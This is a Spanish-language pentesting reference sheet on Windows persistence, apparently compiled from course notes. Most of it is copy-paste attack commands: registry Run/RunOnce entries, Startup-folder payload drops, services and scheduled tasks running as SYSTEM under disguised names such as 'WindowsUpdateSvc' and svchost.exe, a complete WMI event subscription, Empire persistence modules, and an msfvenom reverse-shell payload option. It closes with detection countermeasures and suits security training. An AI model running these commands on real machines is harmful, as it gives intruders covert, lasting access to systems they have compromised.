# Persistencia en Windows

## Descripción
La persistencia en Windows abarca las técnicas que permiten a un atacante mantener el acceso a un sistema comprometido a través de reinicios, cierre de sesiones o cambios de credenciales. Los vectores principales incluyen la manipulación de claves del registro de autoarranque (Run/RunOnce), la creación de tareas programadas, la instalación de servicios maliciosos, el DLL hijacking en aplicaciones legítimas, y la modificación de la carpeta Startup. Estas técnicas aprovechan mecanismos legítimos del sistema operativo, lo que dificulta su detección si no se cuenta con monitoreo adecuado.

## Clasificación
- **Fase**: Post-Explotación
- **MITRE ATT&CK**: T1547.001 (Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder); T1543.003 (Create or Modify System Process: Windows Service); T1053.005 (Scheduled Task/Job: Scheduled Task)
- **Plataforma**: Windows
- **Dificultad**: Intermedia

## Herramientas
- **reg.exe** — manipulación directa del registro de Windows
- **sc.exe** (`create`, `config`) — creación y configuración de servicios
- **schtasks.exe** (`/create`) — creación de tareas programadas
- **msfvenom** (`-p windows/x64/meterpreter/reverse_tcp -f exe`) — generación de payloads
- **PowerShell-Empire** — framework con módulos de persistencia integrados (Starkiller GUI)

## Comandos / Ejemplos

### Persistencia vía registro (Run Keys)
```powershell
# Añadir entrada en Run key del usuario actual (se ejecuta al iniciar sesión)
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "C:\Users\Public\update.exe" /f

# Añadir entrada en Run key de máquina (afecta a todos los usuarios, requiere admin)
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SystemService" /t REG_SZ /d "C:\Windows\Temp\svchost.exe" /f

# RunOnce — se ejecuta una vez y se elimina
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" /v "Update" /t REG_SZ /d "C:\temp\payload.exe" /f

# Usando PowerShell
Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "Updater" -Value "C:\Users\Public\update.exe"

# Verificar entradas existentes
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
```

### Persistencia vía carpeta Startup
```powershell
# Copiar payload a la carpeta Startup del usuario actual
copy C:\temp\payload.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\update.exe"

# Carpeta Startup global (requiere admin)
copy C:\temp\payload.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\update.exe"

# Usando PowerShell
Copy-Item "C:\temp\payload.exe" "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\update.exe"
```

### Persistencia vía servicios de Windows
```powershell
# Crear servicio que ejecute payload como SYSTEM
sc create "WindowsUpdateSvc" binPath= "C:\Windows\Temp\svchost.exe" start= auto obj= "LocalSystem"
sc description "WindowsUpdateSvc" "Windows Update Background Service"
sc start "WindowsUpdateSvc"

# Crear servicio en máquina remota
sc \\10.10.10.50 create "RemoteSvc" binPath= "%windir%\payload.exe" start= auto
sc \\10.10.10.50 start "RemoteSvc"

# Verificar servicios existentes
sc query state= all | findstr "SERVICE_NAME"
```

### Persistencia vía tareas programadas
```powershell
# Crear tarea que se ejecute al iniciar sesión como SYSTEM
schtasks /create /tn "Microsoft\Windows\SystemUpdate" /tr "C:\Windows\Temp\svchost.exe" /sc onlogon /ru SYSTEM

# Crear tarea que se ejecute cada hora
schtasks /create /tn "SystemCheck" /tr "C:\Windows\Temp\svchost.exe" /sc hourly /mo 1 /ru SYSTEM

# Tarea al arranque del sistema
schtasks /create /tn "BootUpdate" /tr "C:\Windows\Temp\svchost.exe" /sc onstart /ru SYSTEM
```

### Persistencia vía WMI Event Subscription
```powershell
# Persistencia avanzada usando WMI — se ejecuta cuando ocurre un evento específico
# Crear filtro de evento (trigger al arranque, cada 60 segundos)
$FilterArgs = @{
    Name = 'SystemUpdateFilter'
    EventNameSpace = 'root\cimv2'
    QueryLanguage = 'WQL'
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 120 AND TargetInstance.SystemUpTime < 180"
}
$Filter = New-CimInstance -ClassName __EventFilter -Namespace root/subscription -Property $FilterArgs

# Crear consumidor (acción)
$ConsumerArgs = @{
    Name = 'SystemUpdateConsumer'
    CommandLineTemplate = 'C:\Windows\Temp\svchost.exe'
}
$Consumer = New-CimInstance -ClassName CommandLineEventConsumer -Namespace root/subscription -Property $ConsumerArgs

# Vincular filtro con consumidor
$BindingArgs = @{
    Filter = [ref]$Filter
    Consumer = [ref]$Consumer
}
New-CimInstance -ClassName __FilterToConsumerBinding -Namespace root/subscription -Property $BindingArgs
```

### Persistencia con PowerShell-Empire
```bash
# Desde PowerShell-Empire (Starkiller GUI o CLI)
# Usar módulo de persistencia
usemodule powershell/persistence/elevated/registry
set Listener http
set RegPath HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion\Run
execute

# Módulo de persistencia vía scheduled task
usemodule powershell/persistence/elevated/schtasks
set Listener http
set DailyTime 09:00
execute
```

## Contramedidas
- Monitorear cambios en claves de registro de autoarranque con Sysmon (Event ID 12, 13, 14)
- Auditar creación de servicios: Event ID 7045 (System log) y Event ID 4697 (Security log)
- Monitorear creación de tareas programadas: Event ID 4698
- Implementar AppLocker o WDAC para restringir ejecución de binarios no autorizados
- Revisar periódicamente la carpeta Startup y las claves Run/RunOnce del registro
- Monitorear suscripciones WMI con `Get-CimInstance -Namespace root/subscription -ClassName __EventFilter`
- Usar EDR con capacidad de detección de técnicas de persistencia conocidas
- Implementar Sysmon con configuración detallada para registrar creación de procesos, conexiones de red y modificaciones del registro

## Referencias
- MITRE Corporation. (2024). ATT&CK Technique T1547.001: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder. https://attack.mitre.org/techniques/T1547/001/
- MITRE Corporation. (2024). ATT&CK Technique T1543.003: Create or Modify System Process: Windows Service. https://attack.mitre.org/techniques/T1543/003/
- BC-SECURITY. (s.f.). *Empire* [Software]. GitHub. https://github.com/BC-SECURITY/Empire
- Kim, P. (2018). *The Hacker Playbook 3*. Secure Planet, LLC.
- Harper, A., Linn, R., Sims, S., & Baucom, M. (2018). *Gray Hat Hacking* (5th ed.). McGraw-Hill Education.
- Cole, E. (2014). *Advanced Persistent Threat Hacking*. Syngress.
- Notas del proyecto: notas-md/INE Courses/INE Courses/Host & Network Penetration Testing Exploitation/PowerShell-Empire.md
- Notas del proyecto: notas-md/HNotes/HNotes/TryHackMe/Lateral Movement and Pivoting.md
